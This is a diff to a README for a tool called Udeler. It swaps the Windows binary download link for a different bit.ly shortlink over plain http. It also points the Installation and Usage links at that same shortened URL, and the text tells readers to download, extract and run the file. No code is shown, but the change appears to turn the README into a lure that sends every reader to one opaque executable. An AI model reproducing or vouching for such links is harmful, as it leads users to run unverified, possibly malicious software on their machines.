@@ -8,15 +8,15 @@ Since Udeler v1.6.0, there is support for login through Udeler Authenticator (A 
 
 # How to get started
   1) First, install the script following any one of these   
-      * [Windows Binary Release](https://bit.ly/3IvLM6U)
+      * [Windows Binary Release](http://bit.ly/3GoI8ck)
   2) Install and run program on Windows
   
 # Topics
        
 [Windows]()  
-&ensp;&emsp;[Binary Release](https://bit.ly/3IvLM6U)  
-&ensp;&emsp;[Installation](https://bit.ly/3IvLM6U)  
-&ensp;&emsp;[Usage](https://bit.ly/3IvLM6U)  
+&ensp;&emsp;[Binary Release](http://bit.ly/3GoI8ck)  
+&ensp;&emsp;[Installation](http://bit.ly/3GoI8ck)  
+&ensp;&emsp;[Usage](http://bit.ly/3GoI8ck)  
 
 
 * Download the file provided in the release, extract the file and run the file.
